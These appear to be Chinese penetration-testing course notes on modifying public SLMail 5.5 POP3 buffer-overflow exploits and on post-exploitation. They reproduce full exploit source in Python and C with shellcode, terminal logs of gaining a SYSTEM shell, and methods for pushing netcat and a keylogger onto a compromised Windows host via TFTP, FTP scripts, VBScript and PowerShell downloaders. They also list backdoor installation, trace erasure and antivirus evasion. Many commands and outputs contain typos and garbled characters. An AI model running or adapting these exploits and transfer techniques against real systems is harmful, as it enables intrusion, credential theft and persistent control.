@@ -1,0 +1,500 @@
+课时43 选择和修改EXP
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃选择和修改EXP                                   ┃
+┃网公开的EXP代码                                 ┃
+┃    选择可信赖的EXP源                           ┃
+┃    Exploit-db                                  ┃
+┃    SecruityFocus                               ┃
+┃    Searchsploit                                ┃
+┃    有能力修改EXP(Python、Perl、Ruby、C、C++...)┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+www.securityfocus.com
+
+╋━━━━━━━━━━━━━━━━━╋
+┃选择和修改EXP                     ┃
+┃646.c                             ┃
+┃    类unix坏境下编译              ┃
+┃    返回地址与我们的环境不符      ┃
+┃    反弹shell硬编码了回链IP地址   ┃
+┃    缓冲区偏移量与我们的环境不符  ┃
+┃    目标IP硬编码                  ┃
+╋━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# searchsploit slmail
+--------------------------------------------- ----------------------------------
+ Exploit Title                               |  Path
+                                             | (/usr/share/exploitdb/platforms)
+--------------------------------------------- ----------------------------------
+SLMail 5.5 - POP3 PASS Buffer Overflow Explo | ./windows/remote/638.py
+SLMail 5.5 - POP3 PASS Remote Buffer Overflo | ./windows/remote/643.c
+SLMail 5.5 - Remote Buffer Overflow Exploit  | ./windows/remote/646.c
+SLMail Pro 6.3.1.0 - Multiple Remote Denial  | ./windows/dos/31563.txt
+--------------------------------------------- ----------------------------------
+
+root@kali:~# cp /usr/share/exploitdb/platforms/windows/remote/638.py .
+
+root@kali:~# cp /usr/share/exploitdb/platforms/windows/remote/643.c .
+
+root@kali:~# cp /usr/share/exploitdb/platforms/windows/remote/646.c .
+
+root@kali:~# ls
+638.py  643.c   646.c  公共  模板  视频  图片  文档  下载  音乐  桌面
+
+╭────────────────────────────────────────────╮
+[638.py]
+##########################################################                                                       ## SLmail 5.5 POP3 PASS Buffer Overflow               	## Discovered by : Muts                                  ## Coded by : Muts                                       ## www.offsec.com                                        ## Plain vanilla stack overflow in the PASS command  	##                                                       ########################################################### D:\Projects\BO>SLmail-5.5-POP3-PASS.py                ########################################################### D:\Projects\BO>nc -v 192.168.1.167 4444               ## localhost.lan [192.168.1.167] 4444 (?) open           #   # Microsoft Windows 2000 [Version 5.00.2195]            ## (C) Copyright 1985-2000 Microsoft Corp.               ## C:\Program Files\SLmail\System>                       ##########################################################import structimport socketprint "\n\n###############################################"print "\nSLmail 5.5 POP3 PASS Buffer Overflow"print "\nFound & coded by muts [at] offsec.com"print "\nFor Educational Purposes Only!" print "\n\n###############################################"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66"sc += "\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6"sc += "\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa"sc += "\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f"sc += "\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb"sc += "\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba"sc += "\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb"sc += "\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc"sc += "\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61"sc += "\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70"sc += "\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44"sc += "\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7"sc += "\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69"sc += "\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9"sc += "\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0"sc += "\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3"sc += "\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7"sc += "\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0"sc += "\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67"sc += "\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1"sc += "\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0"sc += "\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88"sc += "\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d"sc += "\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95"sc += "\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2"#Tested on Win2k SP4 Unpatched# Change ret address if neededbuffer = '\x41' * 4654 + struct.pack('<L', 0x783d6ddf) + '\x90'*32 + sc try:	print "\nSending evil buffer..."	s.connect(('192.168.1.167',110))	data = s.recv(1024)	s.send('USER username' +'\r\n')	data = s.recv(1024)	s.send('PASS ' + buffer + '\r\n')	data = s.recv(1024)	s.close()	print "\nDone! Try connecting to port 4444 on victim machine."except:	print "Could not connect to POP3!"# milw0rm.com [2004-11-18]
+╰────────────────────────────────────────────╯
+
+╭────────────────────────────────────────────╮
+[646.c]
+/*SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дуракнедействительный 31337 Team*/#include <string.h>#include <stdio.h>#include <winsock2.h>#include <windows.h>// [*] bind 4444 unsigned char shellcode[] = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45""\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49""\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d""\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66""\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61""\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40""\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32""\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6""\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09""\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0""\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff""\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53""\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff""\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64""\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89""\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab""\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51""\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53""\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6""\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0";void exploit(int sock) {      FILE *test;      int *ptr;      char userbuf[] = "USER madivan\r\n";      char evil[3001];      char buf[3012];      char receive[1024];      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"                       "\x90\x90\x90\x90\x90\x90\x90\x90";      memset(buf, 0x00, 3012);      memset(evil, 0x00, 3001);      memset(evil, 0x43, 3000);      ptr = &evil;      ptr = ptr + 652; // 2608       memcpy(ptr, &nopsled, 16);      ptr = ptr + 4;      memcpy(ptr, &shellcode, 317);      *(long*)&evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP      // banner      recv(sock, receive, 200, 0);      printf("[+] %s", receive);      // user      printf("[+] Sending Username...\n");      send(sock, userbuf, strlen(userbuf), 0);      recv(sock, receive, 200, 0);      printf("[+] %s", receive);      // passwd      printf("[+] Sending Evil buffer...\n");      sprintf(buf, "PASS %s\r\n", evil);      //test = fopen("test.txt", "w");      //fprintf(test, "%s", buf);      //fclose(test);      send(sock, buf, strlen(buf), 0);      printf("[*] Done! Connect to the host on port 4444...\n\n");}int connect_target(char *host, u_short port){    int sock = 0;    struct hostent *hp;    WSADATA wsa;    struct sockaddr_in sa;    WSAStartup(MAKEWORD(2,0), &wsa);    memset(&sa, 0, sizeof(sa));    hp = gethostbyname(host);    if (hp == NULL) {        printf("gethostbyname() error!\n"); exit(0);    }    printf("[+] Connecting to %s\n", host);    sa.sin_family = AF_INET;    sa.sin_port = htons(port);    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);    sock = socket(AF_INET, SOCK_STREAM, 0);    if (sock < 0)      {        printf("[-] socket blah?\n");        exit(0);        }    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)        {printf("[-] connect() blah!\n");        exit(0);          }    printf("[+] Connected to %s\n", host);    return sock;}int main(int argc, char **argv){    int sock = 0;    int data, port;    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }    port = 110;    sock = connect_target(argv[1], port);    exploit(sock);    closesocket(sock);    return 0;}
+╰────────────────────────────────────────────╯
+root@kali:~# gedit 638.py
+root@kali:~# gedit 646.c
+
+root@kali:~# gcc 646.c -0 646
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃选择和修改EXP                                                               ┃
+┃646.c                                                                       ┃
+┃    Windows环境下编译                                                       ┃
+┃    apt-get install mingw32                                                 ┃
+┃                                                                            ┃
+┃                                                                            ┃
+┃    dpkg --add-architecture i386 && apt-get update && apt-get install wine32┃
+┃    i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe                           ┃
+┃    wine sl.exe 192.168.20.32                                               ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# apt-get install mingw32
+
+root@kali:~# dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+
+root@kali:~# i586-mingw32wsvc-gcc 646.c -lws2_32 -o sl.exe
+646.c: In function 'exploit':
+646.c:46:11: warning: assignment from incompatiable poiter type
+       ptr = &evil;
+           ^
+root@kali:~# wine sl.exe 192.168.20.32
+root@kali:~# file ls.exe
+ls.exe: PE32 executable(console) Intel 80386, for MS Windows
+root@kali:~# gedit 646.c
+root@kali:~# gedit 646.c
+root@kali:~# wine
+wine          wine64         winecfg         winefile        wine-wrapper
+wine32        wineboot       wiedbg          winepath        winexe
+root@kali:~# wine32 sl.exe 192.168.1.119
+
+[&] SLmail Server POP2 PASSWD Buffer Overflow exploit
+[&] by Mad Ivan [  void31337 team ] - http://exploit.void1337.ru
+
+[+] Connectiong to 192.168.1.119
+[-] connet() blah!
+
+╋━━━━━━━━━━━━━━━━━━━━━╋
+┃选择和修改EXP                             ┃
+┃不同的EXP                                 ┃
+┃    不同的系统补丁                        ┃
+┃    软件版本                              ┃
+┃    不同的offset、shellcode               ┃
+┃扫描探测目标系统版本，搭建适当的测试环境  ┃
+┃    避免一锤子测试                        ┃
+┃修改公开的EXP满足不同坏境需要             ┃
+┃    了解漏洞原理，修改溢出代码            ┃
+╋━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━╋
+┃漏洞利用后阶段                ┃
+┃上传工具                      ┃
+┃提权                          ┃
+┃擦除攻击痕迹                  ┃
+┃安装后门                      ┃
+┃    长期控制                  ┃
+┃    Dump密码                  ┃
+┃    内网渗透                  ┃
+┃后漏洞利用阶段                ┃
+┃    最大的挑战-----防病毒软件 ┃
+┃    使用合法的远程控制软件    ┃
+╋━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━╋
+┃漏洞利用后阶段                ┃
+┃上传文件                      ┃
+┃    持久控制                  ┃
+┃    扩大对目标系统的控制能力  ┃
+┃Linux系统                     ┃
+┃    netcat                    ┃
+┃    curl                      ┃
+┃    wget                      ┃
+┃Windows                       ┃
+┃    缺少预装的下载工具        ┃
+╋━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━╋
+┃漏洞利用后阶段        ┃
+┃非交互模式shell       ┃
+┃    类NC远程控制shell ┃
+┃    ftp 192.168.1.1   ┃
+╋━━━━━━━━━━━╋
+
+root@kali:~# nc -vlp 444
+Listening on [any] 444 ...
+connect to [192.168.1.117] from localhost [192.168.1.119] 1034
+Microsoft Windows XP {?? 5.1.2600]
+(C) ????? 1989-2001 Microsoft Corp.
+
+C:\Progran Files\SLmail\System>
+cd\
+
+C:\>dir
+dir
+????? C ??????
+?????? ??? 94CE=E07B
+
+C:\>cd windows
+cd windows
+
+C:\WINDOWS>cd \
+cd \
+
+C:\>ftp
+ftp
+open 127.0.0.1
+User (127.0.0.1:(none)): yuanfh
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃使用TFTP传输文件                                ┃
+┃XP、2003默认安装                                ┃
+┃Win7、2008需要单独添加                          ┃
+┃经常被边界防火墙过滤                            ┃
+┃Kali                                            ┃
+┃    mkdir /tftp                                 ┃
+┃    atftpd --daemon --port 69                   ┃
+┃    cp /usr/share/windows-binaries/nc.exe /tftp/┃
+┃    chown -R nobody /tftp                       ┃
+┃Windwos                                         ┃
+┃    tftp -i 192.168.10.5 get nc.exe             ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# mkdir /tftp
+root@kali:~# chown -R nobody /tftp/
+root@kali:~# cp /usr/share/windows-binaries/
+backdoors/        Hperion-1.0.zip  nc.txt               wget.exe
+enumplus/         klogger.exe      plink.exe            whoami.exe
+exe2.bat.exe      mbenm/           radmin.exe
+fgdump/           nbtenum/         abd.exe
+fport/            nc.exe           vncviewer.exe
+
+root@kali:~# cp /usr/share/windows-binaries/
+root@kali:~# cp /usr/share/windows-binaries/whoami.exe /tftp/
+
+root@kali:~# cp /usr/share/windows-binaries/klogger.exe /tftp/
+
+root@kali:~# atftpd --deamon --port 69 /tftp
+root@kali:~# nestat -panu | grep 69
+udp        0     0 0.0.0.0:69                0.0.0.0:*
+537/inetd
+root@kali:~# killl 537
+root@kali:~# ls /tftp/ -dl
+drwxr-xr-x 2 nobody root 4096 9月    6 20:13 /tftp/
+root@kali:~# cd /tftp/
+
+root@kali:/tftp# ls -l
+-rwxr-xr-x 1 root root 23552 9月     6 20:13 klogger.exe
+-rwxr-xr-x 1 root root 66560 9月     6 20:13 whoami.exe
+
+root@kali:/tftp# cd
+
+root@kali:~# chown -R nobody /tftp/
+
+root@kali:~# ls -l /tftp/
+
+root@kali:/tftp# ls -l
+-rwxr-xr-x 1 nobody root 23552 9月     6 20:13 klogger.exe
+-rwxr-xr-x 1 nobody root 66560 9月     6 20:13 whoami.exe
+root@kali:~# atftpd --deamon --port 69 /tftp
+root@kali:~# nestat -panu | grep 69
+udp        0     0 0.0.0.0:69                0.0.0.0:*
+2769/atftpd
+
+C:\>tftp
+
+C:\>tftp -i 192.168.117 get atftpd klogger.exe
+
+C:\>tftp -i 192.168.117 get whoami.exe
+
+C:\>tftp -i 192.168.117 get atftpd kiogger.exe
+
+C:\>whoami
+whoami
+NT AUTHORITY\SYSTEM
+
+C:\>klogger
+klogger
+
+C:\>taklist /SVC
+taklist /SVC
+ taklist' ??????????
+
+C:\>tasklist
+
+C:\>typw klogger.txt
+usrname:yuanfh
+password:password01234
+
+╋━━━━━━━━━━━━━━━╋
+┃使用FTP传输文件               ┃
+┃Kali                          ┃
+┃    apt-get install pure-ftpd ┃
+┃    ftp.sh                    ┃
+╋━━━━━━━━━━━━━━━╋
+
+╭────────────────────────────────────────────╮
+[ftp.sh]
+#!/bin/bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd yuanfh -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+/etc/init.d/pure-ftpd restart
+╰────────────────────────────────────────────╯
+
+root@kali:~# chmod +x ftp.sh
+root@kali:~# ./ftp.sh
+groupadd:"ftpgroup"组已存在
+useradd:用户"ftpuser"已存在
+Password:
+Enter it again:
+Error.
+Check that [yuanfh] doesn't already exist.
+and that [/etc/pure-ftpd/pureftpd.passwd.tmp] can be written.
+In: 无法创建符号链接"60pdb":文件已存在
+[ ok ] Restarting pure-ftpd(via systemctl): pure-ftpd.service
+
+╋━━━━━━━━━━━━━━━━━━━━━╋
+┃使用TFTP传输文件                          ┃
+┃Windows                                   ┃
+┃    echo open 192.168.1.117 21 > ftp.txt  ┃
+┃    echo yuanfu>> ftp.txt                 ┃
+┃    echo password>> ftp.txt               ┃
+┃    echo bin >> ftp.txt                   ┃
+┃    echo GET whoami >> ftp.txt            ┃
+┃    echo GET klogger >> ftp.txt           ┃
+┃    echo bye >> ftp.txt                   ┃
+┃    ftp -s: ftp.txt                       ┃
+╋━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\>echo open 192.168.1.117 21 > ftp.txt
+echo open 192.168.1.117 21 > ftp.txt
+
+C:\>echo yuanfu >> ftp.txt
+echo yuanfu >> ftp.txt
+
+C:\>echo password>> ftp.txt  
+echo password>> ftp.txt  
+
+C:\>echo bin>> ftp.txt
+echo bin > ftp.txt
+
+C:\>echo GET whoami >> ftp.txt
+echo GET whoami >> ftp.txt
+
+C:\>echo GET klogger >> ftp.txt
+echo GET klogger >> ftp.txt
+
+C:\>echo bye >> ftp.txt
+echo bye >> ftp.txt
+
+C:\>type ftp.txt
+type ftp.txt
+open 192.168.1.117 21
+yuanfh
+password
+bin
+GET whoami.exe
+GET klogger.exe
+bye
+
+C:\>ftp -s: ftp.txt
+ftp -s: ftp.txt
+User(192.68.1.117:(none)): open 192.168.1.117 21
+
+bin
+GET whoami.exe
+Can't open whoami.exe: No such file or directory
+GET klogger.exe
+Can't open klogger.exe: No such file or directory
+bye
+
+root@kali:~# ls /ftphome/
+root@kali:~# cp /tftp/* /ftphome/
+root@kali:~# ls
+638.py  646.c  ls.exe  模块  图片  下载  桌面
+643.c   b.sh   公共    视频  文档  音乐
+root@kali:~# ls /ftphome/
+klogger.exe  whoami.exe
+
+root@kali:~# ls /ftphome/ -l
+总用量 92
+-rwxr-xr-x 1 nobody root 23552 9月     6 20:13 klogger.exe
+-rwxr-xr-x 1 nobody root 66560 9月     6 20:13 whoami.exe
+
+C:\>ftp -s: ftp.txt
+ftp -s: ftp.txt
+User(192.68.1.117:(none)): open 192.168.1.117 21
+
+bin
+GET whoami.exe
+GET klogger.exe
+bye
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃使用VBSCRIPT传输文件                                  ┃
+┃wget.vbs                                              ┃
+┃                                                      ┃
+┃cscript wget.bvs http://192.168.1.117/whoamixexe w.exe┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# service apache2 start
+
+root@kali:~# netstat -pantu | grep :80
+tcp6       0      0 :::80                    :::*                           LISTEN
+3616/apache2
+
+root@kali:~# cd /var/www/html/
+root@kali:/var/www/html# ls
+index.html
+root@kali:/var/www/html# cp /ftphome/whoami.exe
+
+root@kali:/var/www/html# ls
+index.html  whoami.exe
+
+╭────────────────────────────────────────────╮
+[wget.vbs]
+echo strUrl = WScrpit.Arguments.Item(0) > wget.vbs
+echo StrFile = WScrpit.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strFata, strBuffer, lugCounter, fs, ts >>wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WirnHttp,WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> Wget.vbs
+echo set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scrpiting.FileSystemObject") >>wget.vbs
+echo Set fs = fs.CreateTextFile(StrFile, True) >>wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For IngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >>wget.vbs
+╰────────────────────────────────────────────╯
+
+C:\>...... //复制上面的命令
+
+C:\>dir
+echo strUrl = WScrpit.Arguments.Item(0) > wget.vbs
+echo StrFile = WScrpit.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strFata, strBuffer, lugCounter, fs, ts >>wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WirnHttp,WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set htttp = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> Wget.vbs
+echo set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scrpiting.FileSystemObject") >>wget.vbs
+echo Set fs = fs.CreateTextFile(StrFile, True) >>wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For IngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >>wget.vbs
+
+C:\>cscript wget.bvs http://192.168.1.117/whoamixexe w.exe
+cscript wget.bvs http://192.168.1.117/whoamixexe w.exe
+Microsoft (R) Windows Scrpit Host Version 5.7
+??????C) Microsoft Corporation 1996-2001 ?????????
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃使用VBSCRIPT传输文件                                                                      ┃
+┃wget.vbs                                                                                  ┃
+┃                                                                                          ┃
+┃powershell.exe -ExecutionPolicy Bypass -NoLogo -Nonlnteractive -NoProfile -File wget.ps1  ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+───────────────────────
+$storagaDir = $ped
+$webclient = New-Object System Net.WebClient
+$url = "http://192.168.1.117/whoami.exe"
+$file = "new-exploit.exe"
+$webclient DownloadFile($url,&file)\
+───────────────────────
+
+D:\>dir | find exploit
+
+D:\>whoami
+vv\yuanfh
+
+╋━━━━━━━━━━━━━━━━╋
+┃使用DEBUG传输文件               ┃
+┃Debug                           ┃
+┃    汇编、反汇编                ┃
+┃    16进制dump工具              ┃
+┃    64k字节                     ┃
+┃upx压缩文件                     ┃
+┃wine exe2bat.exe nc.exe nc hex  ┃
+┃debug<nc.hex                    ┃
+┃copy 1.dll nc.exe               ┃
+╋━━━━━━━━━━━━━━━━╋
+root@kali:~# cp /usr/share/windowsp-binaries/nc.exe
+
+root@kali:~# ls
+638.py  643.pc  646.c  b.sh  nc.exe  ls.exe  公共  模板  视频  图片 文档  下载  音乐  桌面
+
+root@kali:~# ls -l nc.exe
+-rwxr-xr-x 1 root root 59392 9月    6 21:00  nc.exe
+root@kali:~# ls -lh nc.exe
+-rwxr-xr-x 1 root root 58k 9月    6 21:00  nc.exe
+root@kali:~# upx -9 nc.exe
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1992 - 2013
+UPX 3.19         Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013
+        
+        File size          Ratio      Format      Name
+   ---------------------  ------    -----------   ----------
+      59392 ->     29184  49.14%      win32/pe    nc.exe
+
+Packed 1 file.
+
+root@kali:~# wine /usr/share/windows-binaries/exe2bat.exe nc.txt
+
+Finished: nc.exe > nc.txt
+
+root@kali:~# cd 9/windows/
+
+root@kali:~# ./09.py
+
+Sending evil buffer...
